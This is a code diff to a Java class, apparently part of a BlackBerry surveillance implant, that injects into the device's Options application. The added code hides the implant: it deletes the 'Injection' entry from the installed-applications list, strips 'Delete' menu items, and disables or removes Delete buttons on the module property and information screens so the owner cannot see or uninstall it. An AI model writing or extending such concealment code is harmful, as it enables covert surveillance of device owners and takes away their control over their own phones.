@@ -3,11 +3,12 @@ package blackberry.injection.injectors;
 import net.rim.device.api.ui.Field;
 import net.rim.device.api.ui.FieldChangeListener;
 import net.rim.device.api.ui.Keypad;
-import net.rim.device.api.ui.Manager;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.component.ButtonField;
+import net.rim.device.api.ui.component.ListField;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.injection.FieldExplorer;
 import blackberry.injection.KeyInjector;
 import blackberry.injection.MenuWalker;
 import blackberry.utils.Utils;
@@ -25,8 +26,8 @@ public class OptionInjector extends AInjector {
     public String getCodName() {
         return "net_rim_bb_options_app";
     }
-    
-    public void injected(){
+
+    public void injected() {
         Utils.sleep(500);
         KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
         Utils.sleep(500);
@@ -37,8 +38,9 @@ public class OptionInjector extends AInjector {
         // lo screen: AppMgmtScreen
         // i dettagli: ModulePropertiesScreen
         // gruppo: ModuleGroupPropertiesScreen
-        return new String[] { "AppMgmtScreen", "ModulePropertiesScreen",
-                "ModuleGroupPropertiesScreen" };
+        return new String[] { "AppMgmtScreen", "ApplicationOptionsScreen",
+                "ModulePropertiesScreen", "ModuleGroupPropertiesScreen",
+                "ModuleInformation", "ModuleGroupInformation" };
     }
 
     public void playOnScreen(Screen screen) {
@@ -51,10 +53,60 @@ public class OptionInjector extends AInjector {
 
         synchronized (getInjectedApp().getAppEventLock()) {
             MenuWalker.deleteMenu(screen, "Delete");
-            if (screenName.endsWith("AppMgmtScreen")) {
+            if (screenName.endsWith("AppMgmtScreen")
+                    || screenName.endsWith("ApplicationOptionsScreen")) {
+
+                FieldExplorer.traverseField(screen, 0,
+                        new FieldChangeListener() {
+                            public void fieldChanged(Field field, int deep) {
+                                String tab = FieldExplorer.getTab(deep);
+
+                                //#ifdef DEBUG
+                                debug.trace("fieldChanged" + tab + " field : "
+                                        + field);
+                                //#endif
+
+                                /*
+                                 * if (field instanceof KeywordFilterField) {
+                                 * //#ifdef DEBUG
+                                 * debug.trace("KeywordFilterField"); //#endif
+                                 * KeywordFilterField lf = (KeywordFilterField)
+                                 * field; ReadableList list =
+                                 * lf.getSourceList(); int delete = -1; for (int
+                                 * i = 0; i < list.size(); i++) { Object obj =
+                                 * list.getAt(i); //#ifdef DEBUG
+                                 * debug.trace("KeywordFilterField: " + tab +
+                                 * obj.toString()); //#endif if
+                                 * (obj.toString().indexOf("Injection") >= 0) {
+                                 * delete = i; } } if (delete != -1) {
+                                 * debug.trace("fieldChanged " + tab +
+                                 * " found deleting field: " + delete); }
+                                 */
+                                if (field instanceof ListField) {
+                                    //#ifdef DEBUG
+                                    debug.trace("ListField");
+                                    //#endif
+                                    ListField lf = (ListField) field;
+
+                                    int pos = lf.indexOfList("Injection", 0);
+                                    if (pos >= 0) {
+                                        //#ifdef DEBUG
+                                        debug.trace("fieldChanged, deleting Injection: "
+                                                + pos);
+                                        //#endif
+                                        lf.delete(pos);
+                                    }
+
+                                }
+
+                            }
+
+                        });
 
             } else if (screenName.endsWith("ModulePropertiesScreen")
-                    || screenName.endsWith("ModuleGroupPropertiesScreen")) {
+                    || screenName.endsWith("ModuleGroupPropertiesScreen")
+                    || screenName.endsWith("ModuleInformation")
+                    || screenName.endsWith("ModuleGroupInformation")) {
 
                 Field field = screen.getFieldWithFocus();
                 //#ifdef DEBUG
@@ -68,49 +120,37 @@ public class OptionInjector extends AInjector {
                     }
                 };
 
-                for (int i = 0; i < screen.getFieldCount(); i++) {
-                    Field fieldi = screen.getField(i);
-                    //#ifdef DEBUG
-                    debug.trace("playOnScreen, field " + i + " : " + fieldi);
-                    //#endif
-                    traverseField(fieldi, 0, new FieldChangeListener() {
-                        public void fieldChanged(Field field, int deep) {
-                            String tab = "";
-                            for (int i = 0; i < deep; i++) {
-                                tab += " ";
-                            }
-                            
-                            //#ifdef DEBUG
-                            debug.trace("fieldChanged"+ tab + " field : "+field);
-                            //#endif
-                            if (field instanceof ButtonField) {
-                                ButtonField bf = (ButtonField) field;
-                                //if (bf.getLabel().indexOf("Delete") >= 0) {
-                                bf.setVisualState(ButtonField.VISUAL_STATE_DISABLED);
-                                debug.trace("fieldChanged"+ tab + " button : "+bf.getVisualState() + " label: " + bf.getLabel()+ " state: " +bf.getFieldStyle());
-                                bf.getManager().delete(bf);
-                                
-                            }
-                            
-                        }
-                    });
+                FieldExplorer.traverseField(screen, 0,
+                        new FieldChangeListener() {
+                            public void fieldChanged(Field field, int deep) {
+                                String tab = FieldExplorer.getTab(deep);
 
-                }
+                                //#ifdef DEBUG
+                                debug.trace("fieldChanged" + tab + " field : "
+                                        + field);
+                                //#endif
+                                if (field instanceof ButtonField) {
+                                    ButtonField bf = (ButtonField) field;
+                                    // {
+                                    bf.setVisualState(ButtonField.VISUAL_STATE_DISABLED);
+                                    debug.trace("fieldChanged" + tab
+                                            + " button : "
+                                            + bf.getVisualState() + " label: "
+                                            + bf.getLabel() + " state: "
+                                            + bf.getFieldStyle());
+                                    bf.setEditable(false);
+
+                                    if (bf.getLabel().indexOf("Delete") >= 0) {
+                                        bf.getManager().delete(bf);
+                                    }
+
+                                }
+
+                            }
+                        });
 
             }
-        }
 
-    }
-
-    private void traverseField(Field field, int deep,
-            FieldChangeListener fieldChangeListener) {
-
-        fieldChangeListener.fieldChanged(field, deep);
-        if (field instanceof Manager) {
-            Manager vf = (Manager) field;
-            for (int i = 0; i < vf.getFieldCount(); i++) {
-                traverseField(vf.getField(i), deep + 1, fieldChangeListener);
-            }
         }
 
     }
